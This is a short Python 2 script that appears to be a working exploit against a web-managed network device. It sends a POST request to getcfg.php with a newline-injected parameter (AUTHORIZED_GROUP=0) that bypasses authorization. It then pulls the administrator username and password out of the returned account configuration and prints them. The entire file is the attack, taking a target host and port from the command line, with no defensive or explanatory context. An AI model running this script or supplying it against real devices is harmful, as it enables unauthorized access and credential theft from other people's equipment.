#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import sys

import requests


def exploit(host, port):
	url = "http://{}:{}/getcfg.php?a=b%0aAUTHORIZED_GROUP%3d0".format(host, port)
	data = {
		"SERVICES": "DEVICE.ACCOUNT"
	}
	try:
		resp = requests.post(url, data, timeout=3)
		resp.close()
	except Exception as ex:
		return "error: {}".format(ex)
	username, password = re.findall(r"<name>(.*?)</name>[\s\S]+<password>(.*?)</password>", resp.text)[0]
	return "username: {}\npassword: {}".format(username, password)


def main():
    if len(sys.argv) != 3:
        print "Usage: {} <host> <port>".format(sys.argv[0])
        exit(1)
    print exploit(sys.argv[1], sys.argv[2])


if __name__ == "__main__":
    main()
